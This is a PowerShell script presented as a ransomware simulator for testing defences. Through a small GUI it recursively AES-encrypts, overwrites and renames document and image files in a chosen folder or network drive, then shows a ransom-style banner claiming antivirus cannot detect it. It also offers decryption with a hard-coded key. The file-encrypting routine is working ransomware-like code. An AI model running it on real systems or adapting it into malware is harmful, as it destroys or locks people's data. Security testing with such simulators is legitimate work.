$global:processedfile=0;
$Key = 'enctest@123'
$shaManaged = New-Object System.Security.Cryptography.SHA256Managed
$aesManaged = New-Object System.Security.Cryptography.AesManaged
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$aesManaged.BlockSize = 128
$aesManaged.KeySize = 256
$aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
#$aesManaged.Key = $Key
$encryptor = $aesManaged.CreateEncryptor()

Function EncryptFile($File){
  $plainBytes = [System.IO.File]::ReadAllBytes($File)
  $outPath = $File + ".gg"

  $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
  $encryptedBytes = $aesManaged.IV + $encryptedBytes

  [System.IO.File]::WriteAllBytes($File, $encryptedBytes)
  Write-Host "Encrypt and overwrite to $File"
  Rename-Item $File $outPath
  Write-Host "Rename to $outPath"
  Write-Host
  if ([System.IO.File]::Exists($outPath)) {
    $global:processedfile += 1
  }

}

Function DecryptFile($File){
  $cipherBytes = [System.IO.File]::ReadAllBytes($File)
  $outPath = $File -replace ".gg"

  $aesManaged.IV = $cipherBytes[0..15]
  $decryptor = $aesManaged.CreateDecryptor()
  $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)

  [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
  Write-Host "Decrypt to $outPath"
  Write-Host
}

Function Banner{
  "<html>" | Out-File -FilePath popup.html
  "<head>" | Out-File -FilePath popup.html -Append
  "<title>EncryptDelTestv4.1</title>" | Out-File -FilePath popup.html -Append
  "<body bgcolor=red>" | Out-File -FilePath popup.html -Append
  "<font size=+10 color=white><b>[EncryptDelTestv4.1]</b></font><br><br><br><br>" | Out-File -FilePath popup.html -Append
  "<font size=+10 color=white>Your anti-virus software <u>CANNOT</u> detect this test</font><br><br>" | Out-File -FilePath popup.html -Append
  "<br>" | Out-File -FilePath popup.html -Append
  "<br>" | Out-File -FilePath popup.html -Append
  "<br>Encryption Key: " + $Key  | Out-File -FilePath popup.html -Append
  "<br>Encrypted File: " + $global:processedfile | Out-File -FilePath popup.html -Append
  "<br>Path: " + $FolderBrowserDialog.SelectedPath | Out-File -FilePath popup.html -Append
  "<br>" + (Get-Date).ToString('MM/dd/yyyy hh:mm:ss tt') | Out-File -FilePath popup.html -Append
  "<br>" | Out-File -FilePath popup.html -Append
  "<br>" | Out-File -FilePath popup.html -Append
  "</body>" | Out-File -FilePath popup.html -Append
  "</html>" | Out-File -FilePath popup.html -Append
  Invoke-Expression .\popup.html
  Write-Host ""
  Write-Host "Encryption Key: " $Key
  Write-Host "Encrypted File: " $global:processedfile
  Write-Host ""
  Write-Host "Operation completed!"
}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$objForm = New-Object System.Windows.Forms.Form
$objForm.AutoSize = $True
$objForm.Text = "[Encrypt Delete Test v4.1]"
$objForm.StartPosition = "CenterScreen"

$objLabel = New-Object System.Windows.Forms.label
$objLabel.Text = "[Encrypt Delete Test v4.1]
Simulate ransomware encryption operation
By Eddie Chu eddiechu.android@gmail.com
Please download the original and latest version from https://github.com/eddiechu/Encrypt-Delete-Test
Version v4.1 (11/Sep/2022)`r`n
This tool encrypts - overwrites - renames the file under selected folder and it's subfolder(s))`r`n
[Caution]
You use this tool completely at your own risk.
"
$objLabel.AutoSize = $True
$objForm.Controls.Add($objLabel)

Write-Host $objLabel.Text
 
$objCombobox=New-Object System.Windows.Forms.combobox
$objCombobox.Text = "Please select"
$objCombobox.Items.add("Encrypt")
$objCombobox.Items.add("Decrypt")
$objCombobox.Top = ($objLabel.Height + 10)
$objForm.Controls.Add($objCombobox)
 
$button_click=
{ 
  if ($objCombobox.SelectedItem -eq "Encrypt"){
    Write-Host 'encrypt'
    $FolderBrowserDialog = New-Object System.Windows.Forms.FolderBrowserDialog
    $FolderBrowserDialog.SelectedPath = (Get-Location).path
    If ($FolderBrowserDialog.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK){
      Write-Host $FolderBrowserDialog.SelectedPath
      Write-Host
      Get-ChildItem $FolderBrowserDialog.SelectedPath -Recurse -Attributes !Directory -Include *.doc,*.docx,*.xls,*.xlsx,*.txt,*.rtf,*.pdf,*.jpg,*.jpeg,*.gif,*.bmp,*.png | % {EncryptFile $_.FullName}
      Banner
    }
  }
  elseif ($objCombobox.SelectedItem -eq "Decrypt"){
    Write-Host 'decrypt'
    $FolderBrowserDialog = New-Object System.Windows.Forms.FolderBrowserDialog
    $FolderBrowserDialog.SelectedPath = (Get-Location).path
    If ($FolderBrowserDialog.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK){
      Write-Host $FolderBrowserDialog.SelectedPath
      Write-Host
      Get-ChildItem $FolderBrowserDialog.SelectedPath -Recurse -Attributes !Directory -Include *.gg | % {DecryptFile $_.FullName}
      Write-Host "Operation completed!"
    }
  }
  Else{
    [System.Windows.Forms.MessageBox]::Show('Please select option',"[Encrypt Delete Test v4.1]",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
  }
}  

$objButton = New-Object System.Windows.Forms.Button
$objButton.Top = ($objLabel.Height + 50)
$objButton.Text = "Choose a folder or network drive to process the test"
$objButton.AutoSize = $True
$objButton.Add_Click($button_click)
$objForm.Controls.Add($objButton)

$objForm.ShowDialog()

$aesManaged.Dispose()
$shaManaged.Dispose()
